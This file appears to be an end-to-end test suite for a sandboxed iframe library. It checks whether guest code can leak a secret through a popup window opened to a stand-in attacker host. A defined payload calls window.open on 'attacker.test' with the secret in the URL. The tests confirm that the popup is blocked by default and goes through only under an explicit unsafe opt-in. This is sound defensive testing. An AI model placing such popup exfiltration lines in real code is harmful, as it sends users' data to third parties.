import { test, expect } from '../../../test/e2e/fixture';

/**
 * Research 13: popup exfiltration (backlog S12, issue #6 N3).
 * A popup is a new top-level window: neither the guest's CSP nor the wrapper's frame-src applies to it.
 */

const ATTACKER = 'http://attacker.test';
const OPEN_POPUP = `window.open('${ATTACKER}/?leak=guest-secret'); console.log('POPUP_TRIED');`;

test('13.1 allow-popups passed as a regular capability is dropped, so no popup leaves', async ({ sandbox, context, page }) => {
    const reached: string[] = [];
    await context.route(`${ATTACKER}/**`, route => { reached.push(route.request().url()); return route.fulfill({ body: '' }); });
    const warnings: string[] = [];
    page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });

    await sandbox.mount({ capabilities: ['allow-scripts', 'allow-popups' as any] });
    await sandbox.run(OPEN_POPUP);
    await sandbox.waitForLog('POPUP_TRIED');
    await page.waitForTimeout(1000);

    expect(reached).toEqual([]);
    expect(warnings.join('\n')).toContain('"allow-popups" is not allowed in "capabilities"');
});

test('13.2 the explicit unsafeCapabilities opt-in still allows popups — and warns', async ({ sandbox, context, page }) => {
    const reached: string[] = [];
    await context.route(`${ATTACKER}/**`, route => { reached.push(route.request().url()); return route.fulfill({ body: '' }); });
    const warnings: string[] = [];
    page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });

    await sandbox.mount({ unsafeCapabilities: ['allow-popups'] });
    await sandbox.run(OPEN_POPUP);
    await sandbox.waitForLog('POPUP_TRIED');
    await page.waitForTimeout(1000);

    // Documents the accepted risk of the opt-in: the URL is the exfiltration channel.
    expect(reached).toEqual([`${ATTACKER}/?leak=guest-secret`]);
    expect(warnings.join('\n')).toContain('unsafe capability "allow-popups" is enabled');
});
